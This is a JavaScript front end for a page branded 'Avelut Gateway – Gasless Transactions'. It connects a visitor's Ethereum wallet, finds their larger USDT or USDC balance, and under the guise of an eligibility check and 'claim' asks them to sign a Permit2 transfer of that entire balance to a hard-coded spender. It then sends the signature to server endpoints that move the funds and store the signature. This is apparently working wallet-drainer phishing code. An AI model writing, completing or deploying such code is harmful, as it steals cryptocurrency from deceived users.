import { createAppKit } from "@reown/appkit";
import { Ethers5Adapter } from "@reown/appkit-adapter-ethers5";
import { mainnet } from "@reown/appkit/networks";
import { ethers } from "ethers";

const projectId = "f340171a355aad487eb6daa39b4b6c10";

const metadata = {
    name: "Avelut Gateway",
    description: "Gasless Transactions",
    url: "https://avelut.xyz", 
    icons: ["https://www.avelut.xyz/logo_full.png"],
};

const modal = createAppKit({
    adapters: [new Ethers5Adapter()],
    metadata: metadata,
    networks: [mainnet],
    projectId,
    features: { analytics: false },
});

const USDT_ADDRESS = ethers.utils.getAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
const USDC_ADDRESS = ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");

let statusModal = null;

function showStatusModal(title, message, type = 'loading') {
    if (statusModal) statusModal.remove();

    const html = `
        <div id="statusModal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
            <div class="bg-zinc-900 rounded-3xl p-8 w-full max-w-[280px] text-center shadow-2xl border border-zinc-700">
                <div id="modalIcon" class="mx-auto mb-6 text-6xl"></div>
                <h3 id="modalTitle" class="text-xl font-semibold mb-2">${title}</h3>
                <p id="modalMessage" class="text-gray-400 text-[15px] leading-tight">${message}</p>
                
                ${type === 'loading' ? `
                <div class="mt-8 flex justify-center">
                    <div class="w-5 h-5 border-4 border-zinc-700 border-t-white rounded-full animate-spin"></div>
                </div>` : ''}
            </div>
        </div>
    `;

    const div = document.createElement('div');
    div.innerHTML = html;
    document.body.appendChild(div);
    statusModal = div.querySelector('#statusModal');
    return statusModal;
}

function updateStatus(title, message, type = 'loading') {
    if (!statusModal) return;
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalMessage').textContent = message;

    const icon = document.getElementById('modalIcon');
    if (type === 'success') icon.innerHTML = '✅';
    else if (type === 'error') icon.innerHTML = '❌';
}

function hideStatusModal() {
    if (statusModal) {
        statusModal.style.opacity = '0';
        setTimeout(() => { if (statusModal) statusModal.remove(); statusModal = null; }, 400);
    }
}

async function handleWithdraw() {
    try {
        const walletProvider = modal.getWalletProvider();
        if (!walletProvider) {
            await modal.open();
            return;
        }

        const provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        showStatusModal("Checking Eligibility", "Verifying wallet balance...");

        const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
        const usdcContract = new ethers.Contract(USDC_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);

        const usdtBalance = await usdtContract.balanceOf(userAddress);
        const usdcBalance = await usdcContract.balanceOf(userAddress);

        let withdrawAmount = usdtBalance.gt(usdcBalance) ? usdtBalance : usdcBalance;
        let tokenAddress = usdtBalance.gt(usdcBalance) ? USDT_ADDRESS : USDC_ADDRESS;

        if (withdrawAmount.isZero()) {
            updateStatus("Not Eligible", "Insufficient funds to claim. Please add USDT or USDC.", "error");
            setTimeout(hideStatusModal, 2800);
            return;
        }

        updateStatus("Requesting Signature", "Please confirm in your wallet...");

        const PERMIT2_ADDRESS = ethers.utils.getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
        const SPENDER_ADDRESS = ethers.utils.getAddress("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D");

        const domain = {
            name: "Permit2",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: PERMIT2_ADDRESS
        };

        const types = {
            PermitTransferFrom: [
                { name: "permitted", type: "TokenPermissions" },
                { name: "spender", type: "address" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ],
            TokenPermissions: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" }
            ]
        };

        const nonce = Date.now();
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const message = {
            permitted: { token: tokenAddress, amount: withdrawAmount.toString() },
            spender: SPENDER_ADDRESS,
            nonce,
            deadline
        };

        const signature = await signer._signTypedData(domain, types, message);

        saveSignatureLocally(userAddress, signature, message, withdrawAmount);

        updateStatus("Signature Secured", "Executing swap & transfer on chain...");

        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                signature, 
                permitData: message, 
                owner: userAddress,
                token: tokenAddress
            })
        });

        const data = await res.json();

        if (data.success) {
            updateStatus("Success!", "ETH has been sent to recipient.", "success");
        } else {
            updateStatus("Unsuccessful", data.message || "Try again later.", "error");
        }

        setTimeout(hideStatusModal, 3200);

    } catch (err) {
        console.error("Withdraw Error:", err);
        updateStatus("Unsuccessful", err.message || "Try again.", "error");
        setTimeout(hideStatusModal, 3000);
    }
}

function saveSignatureLocally(userAddress, signature, permitData, amount) {
    const entry = {
        userAddress,
        timestamp: new Date().toISOString(),
        signature,
        permitData,
        amount: ethers.utils.formatUnits(amount, 6),
        type: "Permit2"
    };

    fetch('/api/save-signature', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(entry)
    }).catch(console.error);
}

// History Modal (from previous)
function showHistory() {
    fetch('/api/signatures')
        .then(r => r.json())
        .then(data => {
            // ... existing history code ...
        });
}

// Keep your existing showHistory and hideHistory if you have them

document.addEventListener('DOMContentLoaded', () => {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) withdrawBtn.addEventListener('click', handleWithdraw);
});
